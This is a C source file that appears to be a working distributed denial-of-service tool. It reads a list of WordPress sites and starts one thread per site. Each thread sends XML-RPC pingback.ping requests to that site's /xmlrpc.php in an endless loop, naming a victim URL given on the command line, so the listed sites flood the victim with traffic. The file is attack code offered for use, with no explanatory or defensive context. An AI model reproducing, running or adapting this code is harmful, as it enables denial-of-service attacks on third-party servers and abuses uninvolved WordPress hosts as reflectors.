#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/param.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <pthread.h>
#include <curl/curl.h>
static int numt = 100;
static char* url = NULL;

static size_t nullsub(void *contents, size_t size, size_t nmemb, void *userp) { return size * nmemb; };
typedef struct entry
{
int i;
char* target;
} entry;


static void *pull_one_url(entry* ent)
{
  CURL *curl;
  int th = ent->i;
  char* pingback_req = malloc(1024+strlen(url)+strlen(ent->target));
  sprintf(pingback_req, "<?xmlversion=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>", url, ent->target);
  curl = curl_easy_init();
  char* urla = malloc(strlen(ent->target) + 20);
  *(char*)(strchr(ent->target, '?')) = 0;
  strcpy(urla, ent->target);
  strcat(urla, "/xmlrpc.php");
  curl_easy_setopt(curl, CURLOPT_URL, urla);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, nullsub);
  curl_easy_setopt(curl, CURLOPT_MAXCONNECTS, numt);
  curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, pingback_req);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(pingback_req));
  while(1)
  {
  curl_easy_perform(curl); /* ignores error */
  }
  curl_easy_cleanup(curl);

  return NULL;
}

int main(int argc, char **argv)
{
  if (argc < 2) {
    puts("usage: ./binary [url]");
    exit(1);
  }
  url=argv[1];
  int mult=1;
  int fd = open("./list.txt", O_RDWR);
  FILE* ofg = fdopen(fd, "rw");
  fseek(ofg, 0L, SEEK_END);
  int ssize = ftell(ofg);
  fseek(ofg, 0L, SEEK_SET);
  char* memblock = mmap(NULL, ssize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
  char* omem = memblock;
  size_t point = 0;
  int newlines = 0;
  while (point <= ssize)
  {
    if (memblock[point] == '\n')
    {
      newlines++;
    }
    point++;
  }
  
  pthread_t* tid=malloc(sizeof(pthread_t) * newlines * mult);
  int i=0,k,z;
  int error;
  curl_global_init(CURL_GLOBAL_ALL);
  for(k=0; k < mult; k++) {
  memblock = omem;
  for(z=0; z < newlines; z++) {
    char* p = strchr(memblock, '\n');
    *p = 0;
    entry* ent = malloc(sizeof(entry));
    ent->i = i+1;
    ent->target = memblock;
    memblock=p+1;
    error = pthread_create(&tid[i],
                           NULL,
                           pull_one_url,
                           (void *)((entry*)ent));
    if(0 != error)
      fprintf(stderr, "Couldn't run thread number %d, errno %d\n", i+1, error);
    else
      fprintf(stderr, "Thread %d initialized\n", i+1, argv[1]);
    i++;
  }
  }
  while(1) sleep(100);
  return 0;
}